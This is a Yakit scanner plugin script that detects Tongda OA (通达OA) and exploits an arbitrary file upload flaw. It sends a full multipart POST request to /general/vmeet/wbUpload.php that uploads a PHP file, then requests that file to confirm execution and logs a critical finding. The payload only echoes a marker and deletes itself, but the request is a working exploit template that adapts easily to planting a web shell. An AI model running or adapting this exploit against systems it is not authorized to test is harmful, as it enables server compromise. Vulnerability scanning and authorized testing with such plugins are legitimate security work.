# port scan plugin
yakit.AutoInitYakit()
log.setLevel("info")

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)
    
    sendpacket = `
POST /general/vmeet/wbUpload.php?fileName=testpoc.php+ HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Content-Length: 228
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: identity
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary59QxyWDTJWyavmpA
Upgrade-Insecure-Requests: 1

------WebKitFormBoundary59QxyWDTJWyavmpA
Content-Disposition: form-data; name="Filedata"; filename="testpoc.php"
Content-Type: application/octet-stream

<?php echo "f47c10c5b6057f617f95f12940869972";unlink(__FILE__);?>
------WebKitFormBoundary59QxyWDTJWyavmpA--`

    checkpacket = `
GET /general/vmeet/wbUpload/testpoc.php HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36

`

    sendrsp,sendreq,_ = poc.HTTP(sendpacket, 
    poc.params({"target":addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )

    checkrsp,checkreq,_ = poc.HTTP(checkpacket, 
    poc.params({"target":addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )

    hand, body = str.SplitHTTPHeadersAndBodyFromPacket(checkrsp)
    drsp, derr = str.ParseBytesToHTTPResponse(checkrsp)
    if derr != nil {
        yakit.Error(string(derr))
        return
    }

    // dump(rsp)
    if drsp.StatusCode == 200 && str.MatchAllOfSubString(body, `f47c10c5b6057f617f95f12940869972`) {
        yakit.Info("%v 通达OA 任意⽂件上传漏洞", addr)
        risk.NewRisk(
            addr,risk.title("通达OA 任意⽂件上传漏洞"),
            risk.severity("critical"),
            risk.titleVerbose("通达OA 任意⽂件上传漏洞存在"),
            risk.type("文件上传[通达OA]"),
            risk.details({
                "request": checkreq,
                "response": checkrsp,
                "url": addr,
            }),
        )
    }

    return
}
handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    // dump(result.GetServiceName())
    // println("-------------------------------")
    // dump(result.GetCPEs())
    // println("-------------------------------")
    // dump(result.GetDomains())
    // println("-------------------------------")
    // dump(result.GetHtmlTitle())
    // println("-------------------------------")
    // dump(result.GetProto())
    // println("-------------------------------")
    // dump(result.Fingerprint.banner)
    

    if len(result.Fingerprint.HttpFlows)>0{
        if str.MatchAllOfSubString(result.GetServiceName(), `tongda-oa`) {
            handleCheck(result.Target,result.Port)
        }
    }
}
